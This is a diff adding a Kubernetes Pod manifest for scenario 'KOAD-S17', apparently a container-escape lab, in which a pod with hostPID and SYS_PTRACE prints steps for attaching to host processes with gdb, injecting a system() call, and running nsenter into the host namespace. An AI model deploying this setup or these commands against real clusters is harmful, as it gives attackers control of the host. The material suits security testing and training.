@@ -1,0 +1,44 @@
+# KOAD-S17: SYS_PTRACE + HostPID Escape
+# ATT&CK: T1611 — Escape to Host
+# Attack: Use SYS_PTRACE capability + hostPID to inject into host processes
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-ptrace
+  namespace: koad
+  labels:
+    koad-scenario: S17
+    mitre-attck: T1611
+    escape-method: sys-ptrace-hostpid
+spec:
+  hostPID: true
+  containers:
+    - name: attacker
+      image: ubuntu:22.04
+      command: ["sh", "-c"]
+      args:
+        - |
+          apt-get update -qq && apt-get install -y -qq strace gdb 2>/dev/null
+          echo "=== KOAD-S17: SYS_PTRACE + HostPID Escape ==="
+          echo ""
+          echo "Attack steps:"
+          echo "  1. List host processes (hostPID=true):"
+          echo "     ps aux"
+          echo ""
+          echo "  2. Find target process (e.g., sshd):"
+          echo "     ps aux | grep sshd"
+          echo ""
+          echo "  3. Attach with strace:"
+          echo "     strace -p <PID>"
+          echo ""
+          echo "  4. Inject shellcode via gdb:"
+          echo "     gdb -p <PID>"
+          echo "     (gdb) call system(\"id > /tmp/pwned\")"
+          echo ""
+          echo "  5. Or nsenter into host namespace:"
+          echo "     nsenter -t 1 -m -u -i -n -p -- /bin/bash"
+          sleep infinity
+      securityContext:
+        capabilities:
+          add: ["SYS_PTRACE"]
